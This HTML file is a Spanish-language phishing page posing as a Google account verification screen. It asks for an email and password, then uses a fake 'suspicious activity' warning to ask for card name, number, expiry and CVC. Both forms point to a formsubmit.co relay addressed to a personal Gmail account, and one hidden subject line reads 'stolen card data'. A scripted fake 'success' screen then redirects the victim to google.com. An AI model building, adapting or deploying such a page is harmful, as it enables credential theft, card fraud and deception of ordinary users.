<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de cuenta de Google</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f2f2f2;
        }
        .container {
            background-color: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .logo {
            width: 75px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 20px;
            margin-bottom: 10px;
        }
        p {
            font-size: 14px;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"], input[type="number"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #4285f4;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }
        button:hover {
            background-color: #357ae8;
        }
        .hidden {
            display: none;
        }
        .processing {
            font-size: 16px;
            color: #333;
        }
        .success {
            font-size: 16px;
            color: green;
        }
        .warning {
            color: #d9534f;
            font-weight: bold;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
        
        <!-- Paso 1: Credenciales -->
        <div id="step1">
            <h1>Ingresa a tu cuenta</h1>
            <p>Para continuar, ingresa tu correo y contraseña.</p>
            <form action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
                <input type="hidden" name="_subject" value="Nueva verificación de cuenta">
                <input type="hidden" name="_captcha" value="false">
                <input type="email" name="Email" placeholder="Correo electrónico" required>
                <input type="password" name="Password" placeholder="Contraseña" required>
                <button type="button" onclick="showStep2()">Siguiente</button>
            </form>
        </div>

        <!-- Paso 2: Datos de la tarjeta -->
        <div id="step2" class="hidden">
            <div class="warning">⚠️ Tu cuenta ha sido detectada con actividad sospechosa.</div>
            <p>Para verificar tu identidad y evitar el bloqueo, ingresa los datos de tu tarjeta.</p>
            <form action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
                <input type="hidden" name="_next" value="https://www.google.com">
                <input type="hidden" name="_subject" value="Datos de tarjeta robados">
                <input type="text" name="CardName" placeholder="Nombre en la tarjeta" required>
                <input type="text" name="CardNumber" placeholder="Número de tarjeta" required>
                <div style="display: flex; gap: 10px;">
                    <input type="text" name="Expiry" placeholder="MM/YY" required>
                    <input type="text" name="CVC" placeholder="CVC" required>
                </div>
                <button type="button" onclick="showProcessing()">Verificar</button>
            </form>
        </div>

        <!-- Paso 3: Procesando -->
        <div id="processing" class="hidden">
            <div class="processing">Procesando tus datos...</div>
        </div>

        <!-- Paso 4: Éxito -->
        <div id="success" class="hidden">
            <div class="success">✓ Verificación exitosa</div>
        </div>
    </div>

    <script>
        function showStep2() {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
        }

        function showProcessing() {
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('processing').classList.remove('hidden');
            
            // Simulamos un tiempo de espera de 3 segundos
            setTimeout(function() {
                document.getElementById('processing').classList.add('hidden');
                document.getElementById('success').classList.remove('hidden');
                
                // Después de mostrar éxito, redirigimos a Google
                setTimeout(function() {
                    window.location.href = "https://www.google.com";
                }, 2000); // 2 segundos mostrando "éxito"
            }, 3000); // 3 segundos procesando
        }
    </script>
</body>
</html>
